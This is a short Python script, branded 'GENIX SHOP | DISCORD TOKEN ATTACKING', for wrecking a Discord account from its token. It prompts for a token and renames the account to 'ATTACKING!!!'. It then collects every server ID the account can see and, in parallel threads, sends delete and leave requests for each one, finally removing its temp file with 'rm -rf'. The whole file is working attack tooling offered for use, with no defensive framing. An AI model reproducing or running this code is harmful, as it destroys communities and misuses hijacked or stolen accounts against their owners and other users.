import threading
import os
import random
import json
import time

try:
	import requests
except ImportError:
	os.system("pip install requests")
	
def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

def checkTOKEN(tokens):
	headers = {
		"authorization": tokens
	}
	response = requests.patch("https://discord.com/api/v9/users/@me",headers=headers,json={"global_name":"GENIX SHOP | ATTACKING!!!"})
	if response.status_code == 401:
		print("      [!] ERROR TOKEN INCORRECT !!")
		time.sleep(2)
		onstart()
	else:
		getServer(tokens)
		
def getServer(tokens):
	headers = {
		"authorization": tokens,
	}
	response = requests.get("https://discord.com/api/v9/users/@me/guilds",headers=headers)
	for data in response.json():
		serverID = data['id']
		with open("serverID.txt", "a+") as f:
			f.write(f"{serverID}\n")
	
def startbot(serverID,tokens):
	r = requests.post(f"https://discord.com/api/v9/guilds/{serverID}/delete",headers={"authorization": tokens})
	r2 = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{serverID}",headers={"authorization": tokens})
	print("    [+] OK DONE ")
	
def onstart():
	clear()
	print("    CREATE BY GENIX SHOP | DISCORD TOKEN ATTACKING")
	print()
	token = input("   >>> ENTER TOKEN : ")
	print()
	checkTOKEN(token)
	
	try:
		f = open("serverID.txt", "r").read().splitlines()
		for getElement in f:
			threading.Thread(target=startbot, args=[getElement,token]).start()
		os.system("rm -rf serverID.txt")
	except:
		pass
	
onstart()